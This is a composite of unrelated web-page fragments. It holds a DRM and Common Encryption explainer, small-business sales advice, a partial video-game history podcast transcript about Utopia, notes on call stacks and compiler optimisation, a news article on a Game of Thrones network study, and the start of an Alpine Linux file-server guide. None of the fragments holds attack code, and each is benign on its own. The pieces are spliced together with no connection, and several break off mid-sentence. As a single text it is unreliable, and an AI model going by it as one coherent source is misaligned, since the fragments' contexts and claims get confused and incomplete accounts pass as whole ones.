<p>For this purpose, the MPEG developed the&nbsp;<a href="https://www.iso.org/standard/68042.html" target="_blank" rel="noopener">CENC or Common Encryption specification</a>, specifying that videos can be encrypted using either&nbsp;<code>cenc</code>&nbsp;(AES-128 CTR) or&nbsp;<code>cbcs</code>&nbsp;(AES-128 CBC).&nbsp;<em>CTR stands for Counter; and CBC stands for Cipher Block Chaining.</em></p>



<p>The implication of CENC is that a content provider needs to encrypt his videos only once and any decryption module can decrypt it.&nbsp;<em>Note: Exposing the encryption algorithm is not a problem as long as the keys are strongly protected.</em></p>



<p><strong>Well, CENC might sound like a magic wand for DRM-unification, but it is not.</strong></p>



<p>There are three primary DRM technologies in the market – Apple FairPlay, Google Widevine, and Microsoft PlayReady.</p>



<ul><li>Apple FairPlay supports only AES-CBC&nbsp;<code>cbcs</code>&nbsp;mode.</li><li>HLS supports only AES-CBC&nbsp;<code>cbcs</code>&nbsp;mode (irrespective of CMAF)</li><li>Widevine and PlayReady support both AES-128 CTR&nbsp;<code>cenc</code>&nbsp;or AES-128 CBC&nbsp;<code>cbcs</code>&nbsp;modes.</li><li>MPEG-DASH with CMAF supports both AES-128 CTR&nbsp;<code>cenc</code>&nbsp;or AES-128 CBC&nbsp;<code>cbcs</code>&nbsp;modes.</li><li>MPEG-DASH without CMAF supports only AES-128 CTR&nbsp;<code>cenc</code>&nbsp;mode.</li></ul>



<p>As you can see, the CMAF and CENC specs have lead to confusion and fragmentation in the streaming space. </p>



<p><strong>A possible convergence point is the universal use of CMAF and AES-CBC&nbsp;cbcs&nbsp;mode, but, how will these impact legacy devices that support only CTR or only MPEG-TS?</strong></p>



<p>That’s a discussion for another time.</p>



<h2 id="step-2-key-keyid-and-the-license-server"><span id="Step_2_Key,_KeyID,_and_the_License_Server"></span>Step 2: Key, KeyID, and the License Server<span></span></h2>



<p>By now, we have established that we will be encrypting or videos using AES-128 bit encryption. At this stage, a few questions that come up are –</p>



<ol><li>Where do we get the AES-128 Encryption Keys?</li><li>How do we associate an Encryption Key with a movie?</li><li>Where do we store the Encryption Keys?</li></ol>



<p>Let’s answer them one at a time.</p>



<h3 id="where-do-we-get-the-aes-128-bit-encryption-keys"><span id="Where_do_we_get_the_AES128_bit_encryption_keys"></span>Where do we get the AES-128 bit encryption keys?<span></span></h3>



<p>Any content provider can generate the encryption keys manually using specialized software. Alternatively, several DRM vendors provide the necessary tools and software to generate these keys.</p>



<h3 id="how-do-we-associate-an-encryption-key-with-a-movie"><span id="How_do_we_associate_an_encryption_key_with_a_movie"></span>How do we associate an encryption key with a movie?<span></span></h3>



<p>Let’s understand the “why” first. When you go to a hotel, you ask the receptionist for the keys to a particular room by mentioning the room number – right? You’re providing the association here between a key and a room by telling her the room number.</p>



<p>Similarly, when we encrypt a movie with a particular key, we need to create that association and provide that to the DRM license server&nbsp;<em>(our receptionist, if you will)</em>.</p>



<p>In DRM, a “<strong>KeyID</strong>” provides the association between an encryption key and a movie. It is a&nbsp;<strong>unique</strong>&nbsp;string of characters generated at the time of creating an encryption key for a particular movie.</p>



<p><em>And finally,</em></p>



<h3 id="where-do-we-store-the-encryption-key--its-keyid"><span id="Where_do_we_store_the_Encryption_Key_its_KeyID"></span>Where do we store the Encryption Key &amp; its KeyID?<span></span></h3>



<p><strong>The Encryption Key and the KeyID are stored in a secure server (Key Store) that works alongside a DRM license server</strong>.</p>



<p>When a client needs to play an encrypted movie, it requests the DRM license server for the decryption key by providing that …</p></div></div>

<p>Currently, you might not be actively selling (as in approaching leads). Or the product sells itself right now (people get in touch with you and buy).&nbsp;</p>



<p>You feel weird about cold-calling, approaching strangers about your offerings. It’s a valid concern.&nbsp;</p>



<p>When you look at your current customer base and revenues: Can you predict when you make a sale? Can you be confident if somebody will follow through with the purchase?&nbsp;</p>



<p>If you don’t have Sales People on staff, this is a challenge. Why should you care, though?</p>



<p>For starters, you might need to plan revenue for the next few months, to hire a new employee, or invest in that new project you’ve been anxious to kick off.</p>



<p>Whatever the motivation is in the end, you need to predict incoming revenue. And for that, you need to sell. As always, there are multiple approaches to this.</p>



<p>As a starting point, you can start to work off all inbound sales inquiries. Your Advantage: No cold outreach to anyone. You focus solely on incoming requests and work them off.&nbsp;</p>



<p>You increase your odds of closing deals with a well-defined sales process. A sales process helps you confidently walk a prospect through each step and increase the chance to become a paying customer.</p>



<p>It still might not allow you to increase revenue as you need it, but you can more effectively predict incoming revenue. This circumstance is already worth a lot because it provides you with a lot more financial stability.&nbsp;</p>



<p>Another circumstance should also make this process more comfortable for you: You are already selling to those who gave you permission. You are allowed to sell. These prospects got in touch with you because they need something from you. Now it’s on you to professionally handle the request and walk them through the process.</p>



<p>With this approach, you’re slowly building Sales Competency in your organization for a more stable revenue foundation.</p>

<h3>(Partial) Transcript</h3>
<p><strong><em>[Most episode transcripts/scripts are reserved for my Patreon supporters (at least for the time being), but I like to give you at least a taster here — or in this case, the first half of the episode.]</em></strong></p><p><span>Welcome to the Life and Times of Video Games, a documentary audio series about video games and the video game industry, as they were in the past and how they've come to be the way they are today. I'm Richard Moss, and this is episode 29, Utopia, and the teacher who made a game of its impossibility.<p>We'll get going in just a moment.</p><p>*pre-roll ad spot*</p><p>***</p><p>Life is chaos. Disorder. Imperfection. Disharmony. And yet we cannot resist the temptation to imagine a perfect world, if only one could exist, and to ponder how we might attain it.</p><p>We call this utopia, a term plucked from the writings of Sir Thomas More, an Englishman who lived in the late-15th and early-16th-century. He was a statesman, lawyer, and philosopher, but today we know him best for a literary work of his called Utopia, a satirical account, told by a fictional character to More himself, of visiting a perfect island society. A place called Utopia, a place that, of course, was flawed in myriad ways, doomed to failure, and frankly much less perfect than our enthusiastic traveller would have you believe, all for reasons left to the reader to identify.</p><p>It was hardly the first time that somebody had imagined — or even satirised — an ideal society, but it captured the imagination in such a way that we named the concept after this fictional place. Utopia, a word meaning "nowhere", or "no place", thus now also means "the perfect place".</p><p>And it has occupied the minds of game designers just as completely over the five decades we've had this digital medium as it had architects, writers, philosophers, painters, and poets for millennia before that.</p><p>But not necessarily for the same reasons — for you see game designers, in the same vein, it seems, as Sir Thomas More, tend to think in systems — not ideals. They look at the interaction of these systems, and examine how the world works. They play with systems, and they create models and simulations with them — so that we may play with them too.</p><p>Thus emerged Utopia, the video game, an early 1982 release for Mattel's Intellivision home video game console. It was a bestseller, but more importantly it was a critical darling that proved so influential it would foreshadow the creation of two, maybe three major genres as well as one of the most influential games of all time.</p><p>But I'm getting ahead of myself. Before I tell you about Utopia's legacy, I want to share the story of its creation. And in order to do that, I need to lay out some background context.</p><p>***</p><p>So let's go back to the mid-1960s, probably around 1964, 17-18 years before Utopia's release. There's this kid, Don Daglow — he's the one who would go on to make Utopia, but at this point he's in sixth grade. He's been hearing for as long as he can remember, from his anthropologist-turned-accountant father, that one day computers are going to change the world. And now his teacher has taken him and a couple of his classmates on a field trip to San Francisco to see some computers up close.</p><p>This is at the time when computers are room-sized monstrosities operated in freezing cold conditions, and when they mainly used punch cards for input. And the operators of one such computer decided to show Don and his classmates a quirk in the design of the system that caused it to emit various electromagnetic frequencies as it operates — frequencies that could in turn be picked up by a portable radio to play sound.</p><iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/EPk8MVEmiTI" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p>Here's Don:</p></span></p><blockquote>Don Daglow: And normally of course that was just kind of this little cacophony of random tunes, but some smart character in their team somewhere, or somewhere where it had been shared, had created a deck that would play a song. And so they'd put that deck in the card reader and play it through. And here's the card reader playing the song. I don't remember what it was. But we all thought that that was really, really cool.</blockquote>
<p><span>(The music in the background just now was not my interpretation but rather an actual recording of one such song, by the way, that some Computer History Museum restorers made a decade ago.)<p>And so with an experience like that to think back on, you can probably understand why this next moment went down the way it did: flash forward to 1971. Don's finished high school and he's in his second year of a liberal arts degree at Pomona College in Southern California, which as it happens had just received a grant from the Sloan Foundation to put two computer terminals in a dormitory for all students to access.</p></span><span><em><br></em></span></p><blockquote><p>Don Daglow: So one day in 1971, you know, some things you remember — when I'm telling this story, I always go, you know, some things you remember in infinite detail. And I remember this day in _great_ detail because it was such a change in my life at that moment. But I was walking down the hallway of the dormitory, just after I walked in, and I hear this clickety click, click, clack, clack, clickety click sound.</p>
<p>And I'm thinking, 'what the heck is that?' And it's coming from this little room with the open door. And this is the dorm I lived in. Just pure luck that that's where the terminal got put. You know, with so many of these things, luck plays such a huge role. And I walked in and here are these two terminals and there's a student and I said, wow, what's this? And she explained what was going on and she said, would you like to try playing a game on the computer?</p>
<p>And so I sat down at the keyboard and I think the first one that she brought up was a horse racing game where you picked a number between one and eight. And then you hit return and then you didn't do anything and just said, okay, a quarter of the way, number three is ahead. Then number two, then number eight. You would just get the order. And so of course it was a one through eight random number guessing game, a 1D8, but it had a narrative and told a story.</p>
<p>And so after I tried a couple of — Oh, and then she said, Oh, well would you like to have a conversation with a psychologist? And she brought up Eliza and I played with Eliza and I went, Oh dear, Oh this is so cool. Cause I was a playwriting major. I thought that my — you know, my grand dream was to, you know, change American theatrical literature as a playwright. You know, all the great dreams you had as a college kid. And I knew that the odds of that were one in 10 million, but it was still kind of my dream and I was willing to work hard at it.</p>
And I thought, what the heck, I'm a good writer. I'll see what happens.</blockquote><p><span><br>He realised that these games he was playing were like interactive theatre. He could write that. And so he did.<br>Don learnt how to write code in BASIC, which at the time was the standard language for getting into computer programming, and he started making programs. And he continued making programs, all through the three remaining years of his undergraduate studies as well as his two years of grad school.<br>Mostly he made games — like a Star Trek game that cast you as captain of the Enterprise and printed out a TV-style script as you made decisions. But there were all sorts of games, some of which I'll cover in more detail in a future episode, and a few of which gained a fair degree of notoriety, but let's keep the story going:</span><span><em><br></em></span></p><blockquote><p>Don Daglow: I was training as a teacher because I knew that playwrights and writers starved. And so I was trained to be a teacher, which I enjoyed doing. And so that meant for — until I got my master's, for almost two more years, I got to keep my computer access. And three days after I got my master's degree, they hired me as an instructor in the teacher training program in the department of education.</p>
<p>And I taught there for four years, which gave me four more years of access in the computer system. So I had nine years in which I could be writing on a mainframe. So basically …</p></blockquote></div></div>

<li><code>mov fp sp</code> in the prologue of functions</li>
<li>Epilogue has "reverse" <code>mov sp fp</code></li>
<li>Instructions that manipulate <em>the stack</em>!</li>
<li>Compiler spills values that registers can't hold onto the stack</li>
<li>Functions do it a lot -- have their own [local] state, call functions that
have their own state</li>
<li>Because subroutines can recurse without bounds would need unbounded number of
registers</li>
<li>Often different kinds of registers: arithmetic value registers, floating
point registers</li>
<li>Registers contain fairly arbitrary "stuff": pointers to data, pointers to
code, return addresses, etc.</li>
<li>Stack is <em>usually</em> contiguous and allocated on a per-thread basis</li>
<li>Idea of "GPRs": general purpose registers, though some machines have
dedicated registers for floating point values as well, or SIMD for really
wide</li>
<li>Prologue moves stack pointer to base pointer, epilogue moves base pointer
back to stack pointer, "undoing", locally manipulating the stack pointer then
rolling things back to where they previously were</li>
</ul>
<h2>00:03:50 Mechanisms in the processor</h2>
<ul>
<li>Frame pointer/base pointer (bp/fp), stack pointer (sp)</li>
<li>Usual convention is that the frame pointer doesn't change during the course
of the function's execution</li>
<li>Generated code addresses "slots" relative (at offsets from) the frame
pointer; e.g. <code>+4</code>, <code>+8</code>, etc.</li>
<li>Stack is kind of like a linked list! Pointer of the stack that says "this is
where the frame pointer <em>used to be</em> before we came into this routine".</li>
</ul>
<h2>00:05:10 Comparison to an abstract stack machine</h2>
<ul>
<li>In CS class you may learn about machines where you push two operands onto a
stack then do an add operation that consumes the top two things on the stack</li>
<li>Compare to traditional processor we use today: expanding the stack as a
single operation that makes a bunch of slots at once</li>
<li>The slots don't need to be consumed in a strictly stack-order fashion</li>
<li>Distinction of "stack machine" vs scratchpad-area style frame areas
that happen in stack-like fashion for subroutine calls</li>
</ul>
<h2>00:06:05 Some instruction set considerations</h2>
<ul>
<li>Considerations on modern machines for frequency of these operations and how
they fit in our instruction cache; e.g. on x86 <code>push</code>/<code>pop</code> are single byte
opcodes</li>
<li>On ARM we may have a "push multiple values" instruction; little CISC-y but you
do so commonly it may make some sense</li>
<li>ARMv7 had instruction allowed to push 16 registers (all GPRs) and increment
stack pointer. Yay RISC!</li>
</ul>
<h2>00:07:09 Compiler optimizations and stackiness</h2>
<ul>
<li>By moving things onto the stack -- code is constantly working with the things
in its stack frame</li>
<li>Locality, but also avoiding memory allocation subroutines (100s or 1000s of
cycle depending)</li>
<li>In scratchpad area values are tracked precisely in dataflow sort of style</li>
<li>Bring them "in" to the compiler, values becomes more trackable</li>
<li>SSA values vs arbitrary memory references</li>
<li>When structs are brought onto the stack the individual fields inside can be
broken apart and the component fields can be tracked as individual values</li>
<li>Often called "scalar replacement of aggregates" (e.g. in LLVM)</li>
<li>When we home them on the stack we can do our common optimizations, CSE, DCE;
if on the heap, may be a lot harder to to do</li>
<li>In managed languages (e.g. JavaScript, Java) would do escape analysis to show
it doesn't escape via heap to an unknown subroutine -- once placed on the
stack you can eliminate whole objects and just track sub-fields inside of it</li>
<li>Allows you to just "explode" the object itself and think about its component
fields individually and get rid of whatever doesn't matter in there</li>
</ul>
<h2>00:09:17 Eliding heap allocations in C++</h2>
<ul>
<li>Some compilers can also sometimes optimize local heap allocations, turn them
into stacky allocation</li>
<li>C++ explicitly allows you to do that as of a few years ago, Clang does that</li>
<li>If you new an object no guarantee that you're actually going to put it on the
heap / call the underlying allocator</li>
<li>Can be surprising to people -- can do SRoA, other stuff, might get rid of the
entire computation</li>
<li>Neat, unless it's not what you're trying to do</li>
<li>But seems like a key optimization to do</li>
<li>If you're thinking about things as objects instead of raw bytes having higher
level understanding you can optimize based off of is pretty key it seems?</li>
</ul>
<h2>00:10:18 Frame pointer omission</h2>
<ul>
<li>When JF started programming there was "frame pointer omission" (FPO) which
was cool because optmizers weren't as good as they are now</li>
<li>Back when you only had 8 registers for x86 the extra register could go a long
way potentially -- stack is hot in cache but doing stores and loads to memory
locations</li>
<li>Was known to some as "that flag that makes the debugger way worse" -- debug
information has to be a lot more prescriptive when you can't simply describe
where things are as an offset from a canonical (assumed unchanging) register</li>
<li>Modern CPUs doing register renaming under the hood against a much bigger
micro-architectural register set -- not as worried about saving that one
register as much of the time -- although in hot code you still might</li>
</ul>
<h2>00:11:49 "Leaf" functions</h2>
<ul>
<li>When you inline things you make bigger regions for analysis, ideally make big
fat leaf functions</li>
<li>How much of program time is generally spent in leaf functions over some set
of applications?</li>
<li>Function at the end of the call tree</li>
<li>If your subroutine doesn't call any other subroutines that's a nice property,
because now you know that everything at the end of the stack belongs to you,
you're just doing your work and popping back up to whoever called you</li>
<li>Inlining really unlocks power of leaf -- inlining into non-leaf-functions can
<em>make</em> them become the leaf</li>
<li>So long as you don't over-inline and the working set doesn't become too big
-- the compiler can know everything it does and have a good amount of work to
do</li>
<li>Small region in which you can analyze <em>everything</em>, like tiny little whole
program analysis</li>
</ul>
<h2>00:13:10 Why do we have a stack again?</h2>
<ul>
<li>Why can't we inline everything?</li>
<li>Two main issues: 1) don't necessarily know call graph for the whole program
2) recursion</li>
<li>If you knew where all the calls went (virtual/indirect/etc in your
translation unit and other ones in your program), and without recursion, you
wouldn't need a stack, you know a perfect call graph</li>
<li>For some of these you could avoid having a stack -- virtual functions but
only a few actually implementations of it, could change to test-and-branch</li>
<li>If you have a fully analyzable virtual dispatch it effectively just becomes a
switch, can potentially inline what the targets are</li>
<li>Control flow analysis takes indirect branch that can go anywhere and
enumerate the real set of possibilities (devirtualization within a
translation unit)</li>
<li>Fully analyzeable call graph is an interesting computer history topic:
FORTRAN77 classically able to do this (programs were restricted enough you
could analyze it)</li>
<li>XLA ML/array programming machine learning compiler has the same property
where the whole call graph is analyzeable so you can create a slab that's the
giant frame for the whole program you're optimizing and all allocations are
known-fixed size</li>
<li>Whole program call graph analyzeability lives on in these niche use cases!</li>
<li>In stark contrast, sometimes we need multiple different kinds of stacks at
the same time!</li>
<li>The JS engine would sometimes recur from JS calls through the VM runtime to
other JS code, and that would need to potentially create a sub-stack (!) --
multi stack problems exist beyond even just needing to analyze/manage a
single stack</li>
<li>Programming in FORTRAN is cool, for scientific code often trying to
solve a specific physics problem don't <em>usually</em> need those tools like
recursion or virtual functions</li>
<li>When everything is "monomorphized" -- you have big arrays of
fixed-value-types you can know everything about the world and really optimize
everything based off of it -- fun mode to be in for scientific computing code</li>
</ul>
<h2>00:16:34 Considerations beyond recursion and indirect calls?</h2>
<ul>
<li>Some languages use the stack for fast thread switching? Things like full
stackful coroutines?</li>
<li>Stacks in Go for example are not contiguous: more like C++ deque: linked list
of lists instead of one contiguous stack -- clever x86 code sequence that
makes it fast to find previous and next frame</li>
<li>Allows Go stacks to be distinct allocations -- each page-wise is one frame
and the next function has another frame -- can put multiple functions in one
allocation</li>
<li>Used to have really bad perf if you were in a hot loop and happened to
straddle that boundary</li>
<li>Coroutines in some languages ended up having some "stackless" stuff like
this, where the closure is heap allocated instead</li>
<li>C++ coroutines try to do away with all the heap allocations, but depends on
optimization level whether it can do that or not</li>
<li>Kind of similar for Objective-C blocks -- until recently always heap
allocated, started being stack allocated in last few years where they could</li>
<li>Language doesn't say whether stuff lives on the heap or not</li>
<li>Because stack is less constrained can live in different places, e.g. in Go</li>
<li>In some cases you remove the allocation entirely</li>
</ul>
<h2>00:18:25 Scaling to millions of threads?</h2>
<ul>
<li>If you want to be able to scale your concurrency assumptions to millions of
threads, you don't want to have huge stacks</li>
<li>Each thread has a stack, and if you have millions of threads you don't want
to be allocating too much</li>
<li>And need to be able to switch between those threads quickly</li>
<li>So raises the question: how do you usually size those stacks in the
per-thread context you have?</li>
<li>If you're doing tiny little operations; e.g. if every operation in your
program was conceptually a thread, you wouldn't want to allocate 512KiB every
time you did a tiny atomic operation</li>
</ul>
<h2>00:19:10 Managed languages putting frames on the heap</h2>
<ul>
<li>On the term "stackless": one of the <a href="https://greenlet.readthedocs.io/en/latest/">Python
"greenlet"</a> ("lightweight thread"
terminology) attempts was called <a href="https://github.com/stackless-dev/stackless/wiki">Stackless
Python</a></li>
<li>In managed languages like Python the frames can be allocated …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4885" role="main"><div><div><div><p>A <a rel="noreferrer noopener" href="https://www.pnas.org/cgi/doi/10.1073/pnas.2006465117" target="_blank">new study by researchers from five universities</a> across the UK and Ireland has found that the overarching social structure and the distribution of deaths in <em>Game of Thrones </em>reflect the typical numbers found in real human societies. As such, the study “provides quantitative support, for example, for the widespread view that deaths appear to be randomly distributed throughout the narrative even though, in fact, they are not,” the authors write.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p><p>The new paper appeared on November 2 in the journal <a rel="noreferrer noopener" href="https://www.pnas.org/" target="_blank"><em>Proceedings of the National Academy of Sciences</em></a>.</p><h2><strong>Deaths in <em>Game of Thrones</em> are anything but random</strong></h2><p>The research team consisted of physicists, mathematicians, and psychologists. They used data science and network theory to analyze <em>A Song of Ice and Fire</em>, the acclaimed book series. These books, by George R.R. Martin, formed the basis for the mega-successful HBO television series <em>Game of Thrones</em>.</p><p>“A distinguishing feature of&nbsp;<em>Ice and Fire</em>&nbsp;,” the paper writes, “is that character deaths are perceived by many readers as random and unpredictable.” Indeed, it continues, “the storyteller has manipulated the timeline of the story in such a way as to make it continuously more appealing by making significant events seem random so as to heighten the reader’s engagement.”</p><p>Likewise, the study writes,<em> “A Song of Ice and Fire</em>&nbsp;is a prodigious modern epic of considerable complexity that remains accessible to a vast congregation of devotees. Among its appeals are the uncertainty and unpredictability of its storyline as characters, including important ones, can be killed off seemingly at random.” And not even the main characters “are guaranteed safe passage from one book to the next.”<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p><p>But as the study points out, when the chronological sequence is reconstructed, the deaths are not random at all. Instead, they resemble how a wide range of common human activities are distributed for in the real world. &nbsp;&nbsp;&nbsp;</p><h2>Unravelling the sequence of deaths in Game of Thrones</h2><p>To analyze the evolution of the narrative, the authors use an approximate timeline of the events depicted in <em>Ice and Fire</em>&nbsp;based on the Westerosi calendar date. It has been compiled by fans, <a href="https://www.reddit.com/r/asoiaf/comments/1c07jw/spoilers_all_most_precise_asoiaf_timeline_in/" target="_blank" rel="noreferrer noopener">and is maintained</a> by the Reddit user identified as <a href="https://www.reddit.com/user/PrivateMajor/" target="_blank" rel="noreferrer noopener">PrivateMajor</a>. They use this timeline to assign an approximate date to each chapter of each book, which allows them to study events as they occur within the in-story timeline.</p><p>Their analysis considers only the deaths of significant characters, deemed to because they appeared in more than one chapter. They made this distinction to avoid including the deaths of “cannon-fodder” characters, “whose main purpose in the story is to die immediately after they are introduced.”</p><p>Past research has shown that inter-event time distributions for “many (nonviolent) human activities in the real world, including communication, entertainment, trading, and work, have power-law tails.” <span data-ez-name="psychnewsdaily_com-box-4"></span></p><p>The distribution of deaths in <em>Game of Thrones </em>and <em>A Song of</em>&nbsp;<em>Ice and Fire</em>&nbsp;are close to what we expect in real social networks, the study finds.</p><h2>“Almost” random intervals</h2><p>As the authors summarize, the way the deaths are distributed in the narrative makes the reader think that these deaths “occur almost at random intervals.” But then “analyzing deaths in terms of story time, this is not the case, with significant events occurring in a more natural way. Portraying significant events by discourse time instead of as they happen appears to maintain the reader’s suspense,” they write.</p><p>“These books are known for unexpected twists, often in terms of the death of a major character,” said <a rel="noreferrer noopener" href="https://www.ul.ie/dafinet/p%C3%A1draig-mac-carron" target="_blank">Pádraig MacCarron</a> of the University of Limerick. “It is interesting to see how the author arranges the chapters in an order that makes this appear even more random than it would be if told chronologically,” he said.</p><h2><strong>Thousands of characters, but Dunbar’s Number still applies</strong></h2><p>The more than 2,000 characters in <em>A Song of Ice and Fire</em> have about 41,000 interactions between them. That’s indeed a lot. But at the chapter-by-chapter level, these numbers average out to match what most people experience in real life.</p><p>Even the most predominant characters, the ones who narrate the story, have only about 150 other people to keep track of, on average. This is the same number that the average human brain has evolved to deal with. It is known as <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar’s number</a>, named after the renowned British anthropologist <a href="https://en.wikipedia.org/wiki/Robin_Dunbar">Robin Dunbar</a>. Dunbar was also a co-author of this new study.</p><p>Despite the huge number of (new) characters and interactions, Martin manages to maintain a consistent social network structure. The number of these interactions is at the upper end of the <a href="https://www.psychnewsdaily.com/new-study-shows-that-bed-sharing-couples-sleep-better/">cognitive</a> capacity of an average reader. As the study’s authors write, “the social network a reader has to consider in order to follow the story is similar in scale to natural cognitive capacity.”</p><p>So, despite there being more than 2,000 characters, none has a social network of more than about 150 people, on average. Plus, there are only 14 major “point of view” characters narrating the story. “These are frequent numbers in the structure of real social networks,” the study writes, “and they allow the reader to work within natural templates.”</p><h2>Keeping cognitive load within realistic limits</h2><p>In other words, “the story reflects experiences in the everyday social world and therefore does not overtax cognitive abilities that are evolved to match these scales.”</p><p>Similar limits have been reported for <a href="https://link.springer.com/article/10.1007%2Fs12110-003-1013-1" target="_blank" rel="noreferrer noopener">Shakespeare’s plays</a>, and seem to “reflect natural limits on mentalizing competences — the cognitive skills that underpin our <a href="https://www.psychnewsdaily.com/why-are-americans-vocabulary-skills-stagnating/">ability</a> to handle social relationships in the virtual mental sphere of the everyday social world.”</p><p>The paper also finds that <em>A Song of Ice and Fire</em> is more similar to the Icelandic sagas than to mythological stories such as England’s Beowulf or Ireland’s Táin Bó Cúailnge.</p><h2><strong>Predicting tomorrow’s complex narratives</strong></h2><p>“People largely make sense of the world through narratives,” said co-author <a href="http://www.colmconnaughton.net/" target="_blank" rel="noreferrer noopener">Colm Connaughton</a> of the University of Warwick, “but we have no scientific understanding of what makes complex narratives relatable and comprehensible. The ideas underpinning this paper are steps towards answering this question.”&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Studies like this one might even be used to map out book and film series that have yet to be created. “I am excited to see the use of network analysis grow in the future,” said <a href="http://www.complexity-coventry.org/people/single-view/detail/Yoseph_Jose/" target="_blank" rel="noreferrer noopener">Joseph Yose</a> of Coventry University. “Hopefully, combined with machine learning, we will be able to predict what an upcoming series may look like,” he said.</p><figure><img loading="lazy" width="1024" height="553" src="https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-1024x553.jpg" alt="" srcset="https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-1024x553.jpg 1024w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-300x162.jpg 300w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-768x414.jpg 768w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1-360x194.jpg 360w, https://www.psychnewsdaily.com/wp-content/uploads/2020/11/game-of-thrones-social-1.jpg 1160w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The social network at the end of the first book <em>A Game of Thrones</em>.

                            <p>If you've ever thought of building a file server, you probably had one or more of these thoughts</p>
<ul>
<li>Do I really need to <strong>waste one disk</strong> for the operating system?</li>
<li>I only have <strong>old hardware</strong> with limited RAM, can I still use it as a file server?</li>
<li>If someone <strong>steals my equipment</strong>, how can I make sure they won't have access to my data?</li>
<li>How can I set up a <strong>samba share</strong> that will allow my windows computers to access the data?</li>
<li>I don't have a display to connect to my file server. How can I do it all <strong>headless</strong>?</li>
<li>Is <strong>software raid</strong> any good? What about ZFS?</li>
</ul>
<p><strong>Well, wonder no more!</strong></p>
<p>We're going to build a system that will handle all those things!</p>

</ol>
<p>My motivation for this was, that I inherited an HP Data Vault x312 <a href="https://www.reddit.com/r/DataHoarder/comments/jkb35f/neighbor_died_of_cancer_and_his_wife_told_me_shes/">from my neighbor who died</a> recently and this device is pretty old, has an Intel Atom d510 with only 2 GB of RAM and no display. It was meant to be used with Windows Home Server. My goal is to use it as an encrypted storage pool for backups running headless Alpine Linux.</p>
<figure><img loading="lazy" src="https://pictshare.net/6c1h06.png"><figcaption>HP Data Vault x312</figcaption></figure>
<hr>


<p>As in my <a href="https://blog.haschek.at/2019/build-your-own-datacenter-with-pxe-and-alpine.html">previous</a> server related <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">posts</a>, my choice of operating system for file servers is <a href="https://alpinelinux.org/about/">Alpine Linux</a> because it's so damn small (ram usage after boot will be ~100mb), fast and has a ton of up to date packages we're going to be using.</p>
<p>Also it can be configured to run from a RAM disk with configuration stored on a USB drive. Which is exactly what we're going to do.</p>
<h2>You're going to need 2 USB drives</h2>
<p>The size doesn't really matter, I'm using two 16G drives. They don't even have to be USB3, it won't make a difference.</p>
<figure><img loading="lazy" src="https://pictshare.net/800/3xiz7b.png"><figcaption>2 USB drives we'll be using</figcaption></figure>
<p>Why two?</p>
<p>We're going to put the ISO of Alpine Linux on one of them and boot it. Then we're using it to create the second one (which will be the one we're actually putting in our server).</p>
<h3>Flashing the USB</h3>
<p>Go to <a href="https://alpinelinux.org/downloads/">https://alpinelinux.org/downloads/</a> and download the latest x68_64 <strong>EXTENDED</strong> ISO and flash it <strong>to one of the USB drives</strong> using dd or some other etcher program.</p>
<p>Command if you're using dd like a pro: <code>dd if=/path/to/your/alpine-extended.iso of=/dev/sdx</code> where sdx is the device name of your USB drive. If unsure run <code>lsblk | grep disk</code> it will show you the device names and sizes for all connecte drives.</p>
<h2>Booting the install USB drive</h2>
<p>This can still be done on one of your devices and not on the file server. We're just preparing the USB installer here.</p>
<p>Plug your freshly flashed USB in a computer or laptop and boot it. You should see this screen</p>
<p>![Freshly booted Alpine Linux]()</p>
<p>Enter <code>root</code> and press enter, you're now logged in.</p>
<h2>Preparing the USB drive for the file server</h2>
<p>Now is a good time to look at the out put of <code>fdisk -l | grep Disk</code> to see which disks are found.</p>
<figure><img loading="lazy" src="https://pictshare.net/vf0ews.png"><figcaption>It should look something like this</figcaption></figure>
<p>Now plug in the second USB drive and run <code>fdisk -l | grep Disk</code> again to see which device name it has.</p>
<figure><img loading="lazy" src="https://pictshare.net/7ylr9z.png"><figcaption>USB drive is known as /dev/sdc</figcaption></figure>
<p>Great now we have to set up the new USB correctly: <code>fdisk /dev/sdc</code> (use the device name of your USB drive)</p>
<p>Now we're in fdisk. We'll empty the USB drive and create a partition that will host the image and configuration.</p>
<p>Press the following keys in fdisk:</p>
<pre><code>o -&gt; enter
n -&gt; enter
p -&gt; enter
1 -&gt; enter
enter (when asking for first sector)
enter (when asking for last sector)
a -&gt; enter
1 -&gt; enter
w -&gt; enter</code></pre>
<p>now if you run <code>fdisk -l /dev/sdc</code> you should see the new layout like this</p>
<figure><img loading="lazy" src="https://pictshare.net/gr1s3i.png"><figcaption>New USB layout</figcaption></figure>
<p>Now we format the new partition FAT32 and install the system from our booted USB drive</p>
<pre><code>mkdosfs -F32 /dev/sdc1
setup-bootable /media/sdb /dev/sdc1</code></pre>
<p>Note: <code>/media/sdb</code> should already be mounted, it's the file system of the live USB you're using. It might have a different name, check <code>df -h</code> to see what device is mounted to <code>/media/</code></p>
<figure><img loading="lazy" src="https://pictshare.net/0grvrm.png"><figcaption>Successful installation</figcaption></figure>
<h2>Let's prepare it for the fileserver</h2>
<p>If you want to install multiple servers, just plug in more USB drives, <code>fdisk</code> and <code>setup-bootable</code> them.</p>
<p>But now we want to set up the USB drive for our file server. Shut down the PC/Laptop/Server you were using, plug in only the second USB drive (the one you just installed Alpine to) and boot it.</p>
<p>It should look exactly like the first USB drive we were using but now we can save changes we make to the system.</p>
<p>The first thing we're going to run is <code>setup-alpine</code>. Here's a small guide what to enter/choose</p>
<pre><code>[your language code] us -&gt; enter
[probably the same code again] us -&gt; enter
[the hostname you want your machine to have] fileserver -&gt; enter
[eth0] -&gt; enter
[dhcp] -&gt; enter (or you can configure static IP here)
done -&gt; enter
[no] -&gt; enter
